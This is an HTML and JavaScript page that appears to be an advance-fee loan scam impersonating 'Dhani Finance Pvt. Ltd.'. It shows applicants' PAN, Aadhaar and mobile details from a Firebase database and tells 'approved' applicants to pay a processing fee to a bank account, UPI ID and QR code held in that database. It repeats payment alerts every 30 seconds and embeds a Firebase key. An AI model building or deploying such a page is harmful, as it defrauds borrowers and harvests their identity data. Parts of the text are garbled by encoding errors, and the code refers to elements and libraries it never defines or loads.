<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dhani Finance â€“ Loan Status</title>

<style>
:root{
  --accent:#2563eb;
  --bg:#fffdf2;
  --text:#333;
  --small:10px;
  --base:11px;
  --sign:11px;
}

/* RESET */
*{margin:0;padding:0;box-sizing:border-box}

body{
  font-family:Arial,sans-serif;
  background:var(--bg);
  color:var(--text);
  padding:10px;
  position:relative;
}

/* WATERMARK */
body::before{
  content:"DHANI FINANCE";
  position:fixed;
  inset:0;
  display:flex;
  justify-content:center;
  align-items:center;
  font-size:50px;
  font-weight:900;
  color:rgba(180,180,180,.12);
  transform:rotate(-30deg);
  pointer-events:none;
  z-index:0;
}

/* LOADING SPINNER */
#loading{
  position:fixed;
  inset:0;
  display:flex;
  justify-content:center;
  align-items:center;
  background:rgba(255,255,255,0.8);
  z-index:1000;
  font-size:18px;
  font-weight:bold;
}

/* HEADER */
h1{
  text-align:center;
  color:var(--accent);
  font-size:14px;
  margin-bottom:6px;
  position:relative;
  z-index:1;
}

/* BASIC INFO */
.label{
  font-weight:bold;
  font-size:var(--base);
  margin-bottom:4px;
  position:relative;
  z-index:1;
}
.label span{
  background:#fff3cd;
  padding:2px 4px;
  border-radius:3px;
}

/* PENDING MESSAGE */
.pending-message{
  display:none;
  margin-top:15px;
  font-size:var(--base);
  line-height:1.4;
  text-align:center;
  color:#444;
}

/* APPROVED MESSAGE */
.approved-mobile, .approved-content{
  margin-top:15px;
  font-size:var(--base);
  line-height:1.4;
  background:none; /* Removed background */
  padding:8px;
  border-radius:5px;
  color:#333;
}

/* QR SECTION */
.qr-box{
  margin-top:10px;
  text-align:left; /* LEFT ALIGN QR */
}
.qr-box p{
  font-weight:bold;
  margin-bottom:5px;
}
#upiQR{
  display:inline-block;
  padding:6px;
  border:1px dashed #999;
  width:136;
  height:129; /* Desktop size */
}

/* FLOATING BUTTONS */
.call-float{
  position:fixed;
  top:10px;
  right:10px;
  z-index:999;
  display:flex;
  flex-direction:column;
  gap:10px;
}
.call-btn, .pdf-btn, #stopReminderBtn{
  font-size:26px;
  color:#dc2626;
  text-decoration:none;
  animation:pulse 1.5s infinite;
  display:flex;
  align-items:center;
  justify-content:center;
  transition:transform 0.2s;
  background:none;
  border:none;
  cursor:pointer;
}

/* pulse animation */
@keyframes pulse{
  0%{transform:scale(1)}
  50%{transform:scale(1.2)}
  100%{transform:scale(1)}
}
.call-btn:hover, .pdf-btn:hover, #stopReminderBtn:hover{transform:scale(1.3);}

/* PAGE STYLE */
.page{
  width:100%;
  min-height:auto;
  margin:15px 0;
  background:none; /* Removed background */
  position:relative;
  z-index:1;
  display:none;
  padding:8px;
  border-radius:5px;
  box-shadow:none; /* Removed shadow */
}

.page h2{
  color:var(--accent);
  font-size:13px;
  margin-bottom:6px;
  text-align:center;
}
.page p, .page li{
  font-size:var(--base);
  line-height:1.3;
  margin-bottom:4px;
}
.page ul{margin-left:12px;margin-bottom:5px;}

/* Authorized Signatory */
.signatory{
  margin-top:8px;
  font-weight:bold;
  text-align:right;
  font-size:var(--sign);
  padding-right:8px;
  display:block;
}

/* PDF page wrapper */
.page-wrapper{
  width:100%;
  margin-bottom:15px;
  page-break-after: always;
  background:none; /* Removed background */
  padding:10px;
  border-radius:5px;
}
.page-wrapper:last-child{
  page-break-after: auto;
}

/* STOP REMINDER BUTTON */
#stopReminderBtn{
  font-size:14px;
  color:#fff;
  background:#2563eb;
  border-radius:5px;
  padding:6px 10px;
  animation:none;
  margin-top:10px;
}

/* MOBILE PDF TEXT ADJUST */
@media only screen and (max-width: 480px){
  .label, .page p, .page li, .approved-content{
    font-size:12px !important;
  }
  h1{font-size:16px;}
  .page h2{font-size:14px;}
}
</style>
</head>

<body>

<!-- LOADING -->
<div id="loading">Loading...</div>

<h1>Dhani Finance Pvt. Ltd.</h1><br>

<!-- Approved fields -->
<div id="approvedFields" style="display:none;">
  <div class="label">ðŸ‘¤ Name â€“ <span id="display_name"></span></div>
  <div class="label">ðŸ“± Mobile â€“ <span id="display_mobile"></span></div>
  <div class="label">ðŸ†” PAN â€“ <span id="display_pan"></span></div>
  <div class="label">ðŸ—‚ Aadhaar â€“ <span id="display_aadhaar"></span></div>
  <div class="label">ðŸ’° Loan Amount â€“ <span id="display_amount"></span></div>
</div>

<!-- Pending / Approved -->
<div class="pending-message" id="pendingMsg">
  Your loan application has been submitted successfully.<br>
  Hamari team aapki details verify kar rahi hai. Jaldi hi aapko update milega.
</div>

<div class="approved-mobile" id="approvedMsg"></div>

<!-- Floating Buttons -->
<div class="call-float">
  <a id="callAdminBtn" href="tel:1800123456" class="call-btn" title="Call Admin">ðŸ“ž</a>
  <button class="pdf-btn" id="downloadPDF" title="Download PDF" style="display:none;">ðŸ“„</button>
</div>

<!-- Pages -->
<div class="page" id="page2">
  <h2>Documents Required</h2>
  <ul>
    <li>PAN Card</li>
    <li>Aadhaar Card</li>
    <li>Latest Salary Slip or Income Proof</li>
    <li>Bank Statement (last 6 months)</li>
    <li>Passport-sized Photograph</li>
    <li>Completed Loan Application Form</li>
  </ul>
</div>

<div class="page" id="page3">
  <h2>Terms & Conditions</h2>
  <ul>
    <li>Interest rates and EMI schedules are as per the loan agreement.</li>
    <li>Late payments may incur additional charges.</li>
    <li>All information provided must be accurate and truthful.</li>
    <li>Loan disbursal is subject to verification of documents.</li>
    <li>The processing fee is non-refundable after approval if documents are incomplete.</li>
    <li>Dhani Finance reserves the right to amend terms without prior notice.</li>
  </ul>
</div>

<div class="page" id="page4">
  <h2>Privacy & Policy</h2>
  <ul>
    <li>All personal data provided is kept confidential.</li>
    <li>Information is only shared with authorized personnel for loan processing.</li>
    <li>We comply with all applicable data protection regulations.</li>
    <li>Your banking details and documents are securely stored in encrypted databases.</li>
    <li>We do not sell or share your information with third parties for marketing purposes.</li>
    <li>You have the right to request deletion or correction of your personal data.</li>
  </ul>
</div>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-auth-compat.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
<!-- QR CODE LIBRARY -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<script>
// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyCsIYVX3OawpDlFZpKU3KpRsfM7QQoyWyY",
  authDomain: "onlineservice-9f153.firebaseapp.com",
  databaseURL: "https://onlineservice-9f153-default-rtdb.firebaseio.com",
  projectId: "onlineservice-9f153",
  storageBucket: "onlineservice-9f153.appspot.com",
  messagingSenderId: "1040271430967",
  appId: "1:1040271430967:web:6325b056257454943d36b2"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

function todayDate(){
  const d = new Date();
  return d.toLocaleDateString("en-GB",{day:"2-digit",month:"short",year:"numeric"});
}

function formatTenure(totalMonths){
  let years = Math.floor(totalMonths / 12);
  let months = totalMonths % 12;
  return `${years} Years, ${months} Months`;
}

let reminderInterval;

firebase.auth().onAuthStateChanged(user => {
  if(!user) return;
  const aadhaar = localStorage.getItem("loan_aadhaar");
  if(!aadhaar) return;

  db.ref("loanUsers/" + aadhaar).once("value").then(snap => {
    document.getElementById('loading').style.display = "none";
    if(!snap.exists()) return;

    const d = snap.val();
    const payInfo = d.payAtThisAccount || {};

    display_name.textContent = d.name || "-";
    display_mobile.textContent = d.mobile || "-";
    display_pan.textContent = d.pan || "-";
    display_aadhaar.textContent = d.aadhaar || "-";
    display_amount.textContent = "â‚¹" + (d.amount || 0).toLocaleString("en-IN");

    if(d.status === "Approved"){
      pendingMsg.style.display = "none";
      document.getElementById("approvedFields").style.display = "block";
      document.getElementById("downloadPDF").style.display = "block";

      let totalMonths = (parseInt(d.tenureYears || 0) * 12) + parseInt(d.tenureMonths || 0);
      const formattedTenure = formatTenure(totalMonths);

      // UPI Link
      const upiLink = `upi://pay?pa=${payInfo.upi||""}&pn=${encodeURIComponent(payInfo.name||"Dhani Finance")}&am=${d.processingFee||0}&cu=INR`;

      approvedMsg.innerHTML = `
<div class="approved-content">
<p><b>Dear ${d.name || ""},</b></p>
<p>We are very glad to inform you that in response to your request for a loan in order to meet</p>
<p>your financial needs. At the outset we welcome you to meet of Dhani Finance pvt.Ltd...</p><br>

<p>You requested a short term loan, Sum of loan amount
<b>â‚¹${(d.amount||0).toLocaleString("en-IN")}/-</b>
for the tenure of
<b>${formattedTenure}</b>
on dated <b>${todayDate()}</b>.
Your monthly EMI is <b>â‚¹${(d.emi||0).toLocaleString("en-IN")}/-</b>
at the rate of <b>${d.interestRate||"0"}%</b>.</p><br>

<p>When you submit File Processing Fee of
<b>â‚¹${(d.processingFee||0).toLocaleString("en-IN")}/-</b>, we will credit
your approved loan to your bank account.</p><br>

<p><b>Pay at This Account</b></p>
<p>
Name â€“ ${payInfo.name || "-"}<br>
A/c No. â€“ ${payInfo.account || "-"}<br>
IFSC Code â€“ ${payInfo.ifsc || "-"}<br>
UPI ID â€“ <b>${payInfo.upi || "-"}</b>
</p>

<div class="qr-box">
<p>Scan & Pay (UPI)</p>
<div id="upiQR"></div>
</div>

<p class="note"><b>Note:-</b><br>
1. We do not accept cash deposit.<br>
2. We accept only NEFT/IMPS/Mobile Banking/Net Banking.<br>
3. Processing fee will be refundable within 24 hours.</p><br>

<p class="signatory">Authorized Signatory<br>Dhani Finance Pvt. Ltd.</p>
</div>`;

      // Generate QR code
      new QRCode(document.getElementById("upiQR"), {
        text: upiLink,
        width: 120,
        height: 120
      });

      approvedMsg.style.display="block";
      callAdminBtn.href = "tel:" + (payInfo.helpline || "1800123456");

      document.getElementById("page2").style.display="block";
      document.getElementById("page3").style.display="block";
      document.getElementById("page4").style.display="block";

      if(d.processingFee && d.processingFee > 0){
          document.getElementById("stopReminderBtn").style.display = "flex";
          reminderInterval = setInterval(() => {
              alert(`Dear ${d.name || "User"}, your loan has been approved. Please submit the processing fee of â‚¹${d.processingFee.toLocaleString("en-IN")}/- to credit your loan.`);
          }, 30000);
      }

    } else {
      pendingMsg.style.display = "block";
      approvedMsg.style.display = "none";
      document.getElementById("approvedFields").style.display = "none";
      document.getElementById("page2").style.display = "none";
      document.getElementById("page3").style.display = "none";
      document.getElementById("page4").style.display = "none";
      document.getElementById("downloadPDF").style.display = "none";
      callAdminBtn.href = "tel:1800123456";
    }

  }).catch(err => {
    document.getElementById('loading').style.display = "none"; 
    console.error(err);
  });
});

document.getElementById("stopReminderBtn").addEventListener("click", () => {
    clearInterval(reminderInterval);
    document.getElementById("stopReminderBtn").style.display = "none";
    alert("Reminder stopped. Thank you!");
});

document.getElementById("downloadPDF").addEventListener("click", () => {

  const pdfContainer = document.createElement("div");
  pdfContainer.style.background = "#fff";
  pdfContainer.style.padding = "10px";

  const page1 = document.createElement("div");
  page1.appendChild(document.getElementById("approvedFields").cloneNode(true));
  page1.appendChild(document.getElementById("approvedMsg").cloneNode(true));
  pdfContainer.appendChild(page1);

  ["page2","page3","page4"].forEach(id=>{
    const p = document.getElementById(id).cloneNode(true);
    p.style.display="block";
    pdfContainer.appendChild(p);
  });

  html2pdf()
    .set({
      jsPDF:{unit:'in',format:'a5',orientation:'portrait'},
      html2canvas:{scale:2},
      margin:0.3
    })
    .from(pdfContainer)
    .toPdf()
    .get('pdf')
    .then(pdf => {

      const blob = pdf.output('blob');

      const ref = firebase.storage().ref(
        "loan_letters/Loan_" + Date.now() + ".pdf"
      );

      ref.put(blob).then(snap=>{
        snap.ref.getDownloadURL().then(url=>{

          // ðŸ”¥ THIS LINE MAKES ANDROID DOWNLOAD FILE
          window.location.href = url;

        });
      });

    });
});


</script>

</body>
</html>
